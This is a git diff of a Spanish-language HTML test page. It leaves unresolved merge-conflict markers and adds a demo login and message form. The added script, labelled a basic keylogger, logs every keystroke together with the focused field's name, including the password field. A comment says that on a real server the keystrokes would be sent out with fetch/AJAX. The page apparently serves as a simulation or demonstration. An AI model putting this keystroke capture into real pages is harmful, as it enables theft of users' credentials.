@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -64,3 +65,53 @@
   <!-- Aquí termina el código JS -->
 </body>
 </html>
+=======
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Web de Prueba Interactiva</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 5vw; }
+    .form-box { max-width: 350px; margin: auto; padding: 2em; border: 1px solid #ccc; border-radius: 5px; }
+    label { display: block; margin-top: 1em; }
+    input, textarea { width: 100%; padding: 0.4em; margin-top: 0.5em; }
+    button { margin-top: 1em; padding: 0.6em 1.2em; }
+  </style>
+</head>
+<body>
+  <div class="form-box">
+    <h2>Login de Prueba</h2>
+    <form id="loginForm">
+      <label>Usuario: <input type="text" name="username" id="user"></label>
+      <label>Contraseña: <input type="password" name="password" id="pass"></label>
+      <button type="submit">Entrar</button>
+    </form>
+    <h2>Mensaje de Prueba</h2>
+    <form id="msgForm">
+      <label>Mensaje: <textarea name="mensaje" id="mensaje"></textarea></label>
+      <button type="submit">Enviar Mensaje</button>
+    </form>
+  </div>
+  <script>
+    // Keylogger básico con contexto de campo
+    document.addEventListener('keydown', function(e) {
+      let campo = document.activeElement.name || document.activeElement.id || 'desconocido';
+      // Simulación: mostrar en consola (en servidor real, enviar con fetch/AJAX)
+      console.log('Campo:', campo, 'Tecla:', e.key);
+    });
+
+    // Pop-up de demostración
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      alert('¡Login capturado! (Simulación)');
+    });
+
+    document.getElementById('msgForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      alert('¡Mensaje capturado! (Simulación)');
+    });
+  </script>
+</body>
+</html>
+>>>>>>> 3a876c2f83162c3225f4a2865a8d9f92157adfe0
